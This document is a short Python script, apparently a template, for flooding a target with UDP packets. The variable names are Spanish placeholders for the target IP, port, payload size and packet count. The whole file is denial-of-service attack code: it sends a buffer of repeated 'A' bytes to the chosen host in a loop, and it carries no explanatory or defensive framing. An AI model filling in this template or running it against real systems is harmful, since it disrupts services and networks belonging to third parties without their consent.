import socket
import time

ip ="IPOBJETIVO"
puerto = PUERTOOBJETIVO

payload = b"A"* TAMAÑOPAYLOAD

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

cantidad = CANTIDADDEPAQUETES

for i in range(cantidad):
        sock.sendto(payload, (ip,puerto))